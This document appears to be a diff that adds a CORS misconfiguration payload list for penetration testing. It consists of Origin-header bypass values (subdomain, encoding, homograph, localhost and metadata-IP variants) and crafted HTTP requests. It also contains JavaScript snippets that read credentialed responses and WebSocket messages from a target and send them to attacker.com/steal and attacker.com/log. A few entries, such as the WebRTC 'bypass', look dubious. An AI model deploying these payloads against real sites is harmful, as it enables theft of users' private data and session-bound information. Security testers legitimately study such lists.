@@ -1,0 +1,276 @@
+# CORS Misconfiguration Payloads
+
+# Basic Origin testing
+Origin: https://evil.com
+Origin: http://evil.com
+Origin: https://attacker.com
+Origin: http://attacker.com
+
+# Null Origin (works in sandboxed iframes)
+Origin: null
+
+# Subdomain variations
+Origin: https://evil.target.com
+Origin: https://target.com.evil.com
+Origin: https://subtarget.com
+Origin: https://admin.target.com
+Origin: https://api.target.com
+
+# Pre-domain bypass
+Origin: https://target.com.evil.com
+Origin: https://wwwtarget.com
+Origin: https://not-target.com
+Origin: https://target.com-evil.com
+Origin: https://target.com.attacker.com
+
+# Post-domain bypass
+Origin: https://evil.target.com
+Origin: https://evil-target.com
+Origin: https://eviltarget.com
+
+# Protocol variations
+Origin: http://target.com
+Origin: https://target.com
+Origin: ftp://target.com
+Origin: file://target.com
+
+# Port variations
+Origin: https://target.com:8080
+Origin: https://target.com:8443
+Origin: https://target.com:443
+Origin: https://target.com:80
+
+# Case sensitivity bypass
+Origin: https://TARGET.COM
+Origin: https://Target.Com
+Origin: https://TaRgEt.CoM
+
+# Underscore in subdomain
+Origin: https://evil_admin.target.com
+Origin: https://admin_.target.com
+
+# Special characters
+Origin: https://target.com%0d%0aEvil: header
+Origin: https://target.com%00.evil.com
+Origin: https://target.com@evil.com
+Origin: https://evil@target.com
+
+# Regex bypass patterns
+Origin: https://target.com.evil.com
+Origin: https://evil.target.com.net
+Origin: https://atarget.com
+Origin: https://target.com.de
+Origin: https://target.co.uk
+Origin: https://target.org
+
+# Localhost variations
+Origin: http://localhost
+Origin: http://127.0.0.1
+Origin: http://0.0.0.0
+Origin: http://[::1]
+Origin: http://localhost.target.com
+
+# File protocol
+Origin: file://
+Origin: file:///etc/passwd
+
+# Wildcard subdomain bypass
+Origin: https://anything.target.com
+Origin: https://xyz123.target.com
+Origin: https://hacker.target.com
+
+# Pre-flight request headers
+Access-Control-Request-Method: POST
+Access-Control-Request-Method: PUT
+Access-Control-Request-Method: DELETE
+Access-Control-Request-Method: PATCH
+Access-Control-Request-Headers: X-Custom-Header
+Access-Control-Request-Headers: Authorization
+Access-Control-Request-Headers: Content-Type
+
+# Data exfiltration payload (JavaScript)
+# For use when CORS is misconfigured
+var req = new XMLHttpRequest();
+req.open('GET', 'https://target.com/api/user/data', true);
+req.withCredentials = true;
+req.onload = function() {
+  fetch('https://attacker.com/steal?data=' + btoa(req.responseText));
+};
+req.send();
+
+# Fetch API exploitation
+fetch('https://target.com/api/sensitive', {
+  credentials: 'include'
+}).then(r => r.text()).then(data => {
+  fetch('https://attacker.com/log?data=' + btoa(data));
+});
+
+# Testing for credential exposure
+GET /api/user HTTP/1.1
+Host: target.com
+Origin: https://evil.com
+Cookie: session=abc123
+
+# WebSocket CORS bypass
+var ws = new WebSocket('wss://target.com/socket');
+ws.onmessage = function(event) {
+  fetch('https://attacker.com/log?data=' + btoa(event.data));
+};
+
+# Multiple Origin headers
+Origin: https://target.com
+Origin: https://evil.com
+
+# Origin with credentials
+Origin: https://user:pass@target.com
+Origin: https://admin@target.com
+
+# Homograph attacks (IDN)
+Origin: https://tаrget.com  # Cyrillic 'а'
+Origin: https://tаrgеt.com  # Cyrillic 'а' and 'е'
+Origin: https://targеt.com  # Cyrillic 'е'
+
+# Bypass via special TLDs
+Origin: https://target.com.local
+Origin: https://target.com.internal
+Origin: https://target.com.corp
+
+# IPv6 localhost variations
+Origin: http://[::1]
+Origin: http://[0:0:0:0:0:0:0:1]
+Origin: http://[0:0:0:0:0:0:0:0]
+Origin: http://[::ffff:127.0.0.1]
+
+# Private IP ranges
+Origin: http://192.168.1.1
+Origin: http://10.0.0.1
+Origin: http://172.16.0.1
+Origin: http://169.254.169.254
+
+# CORS with reflected subdomains
+Origin: https://xss.target.com
+Origin: https://<script>.target.com
+Origin: https://javascript:alert(1).target.com
+
+# Bypass with URL encoding
+Origin: https://%74%61%72%67%65%74.com
+Origin: https://target%2ecom
+
+# Double encoding
+Origin: https://%2574%2561%2572%2567%2565%2574.com
+
+# Unicode bypass
+Origin: https://ⓣⓐⓡⓖⓔⓣ.com
+Origin: https://𝓽𝓪𝓻𝓰𝓮𝓽.com
+
+# Testing Access-Control-Allow-Methods
+GET /api/admin HTTP/1.1
+Host: target.com
+Origin: https://evil.com
+Access-Control-Request-Method: DELETE
+
+# Testing Access-Control-Allow-Headers
+GET /api/user HTTP/1.1
+Host: target.com
+Origin: https://evil.com
+Access-Control-Request-Headers: X-Admin-Token
+
+# Cache poisoning via CORS
+GET /api/data HTTP/1.1
+Host: target.com
+Origin: https://evil.com
+X-Forwarded-Host: evil.com
+
+# CORS with authentication bypass
+GET /api/sensitive HTTP/1.1
+Host: target.com
+Origin: https://evil.com
+Cookie: session=victim_session_token
+
+# Testing weak regex patterns
+Origin: https://target.com.example.com
+Origin: https://example.target.com.example.com
+Origin: https://target_com.example.com
+Origin: https://target-com.example.com
+
+# Path traversal in Origin
+Origin: https://target.com/../../evil.com
+Origin: https://target.com/../evil.com
+
+# Fragment identifier bypass
+Origin: https://target.com#evil.com
+Origin: https://target.com#@evil.com
+
+# Query string in Origin (invalid but test anyway)
+Origin: https://target.com?evil.com
+Origin: https://target.com?redirect=evil.com
+
+# Bypassing with trailing characters
+Origin: https://target.com/
+Origin: https://target.com\
+Origin: https://target.com;
+Origin: https://target.com,
+
+# Mixed content bypass
+Origin: http://target.com (when site uses HTTPS)
+Origin: https://target.com (when site uses HTTP)
+
+# Testing with data URI
+Origin: data:text/html,<script>alert(1)</script>
+
+# Testing with javascript URI
+Origin: javascript:alert(1)
+
+# Origin with username
+Origin: https://admin:password@target.com
+
+# Testing with blob URI
+Origin: blob:https://target.com/uuid
+
+# Custom protocol
+Origin: custom://target.com
+Origin: app://target.com
+
+# Testing max-age for preflight
+Access-Control-Max-Age: 86400
+
+# Wildcard with specific paths
+Origin: https://evil.com/api/public
+
+# Testing exposed headers
+Access-Control-Expose-Headers: Authorization, X-API-Key
+
+# CORS on error pages
+GET /404 HTTP/1.1
+Host: target.com
+Origin: https://evil.com
+
+# CORS on redirect
+GET /redirect HTTP/1.1
+Host: target.com
+Origin: https://evil.com
+
+# Exploiting wildcard subdomains
+Origin: https://attacker-controlled.target.com
+Origin: https://s3bucket.target.com
+Origin: https://malicious.pages.target.com
+
+# Testing JSONP with CORS
+GET /api/data?callback=alert HTTP/1.1
+Host: target.com
+Origin: https://evil.com
+
+# WebRTC CORS bypass
+var pc = new RTCPeerConnection();
+pc.createDataChannel('');
+pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+# Service Worker CORS
+self.addEventListener('fetch', event => {
+  event.respondWith(
+    fetch(event.request.url, {
+      mode: 'cors',
+      credentials: 'include'
+    })
+  );
+});
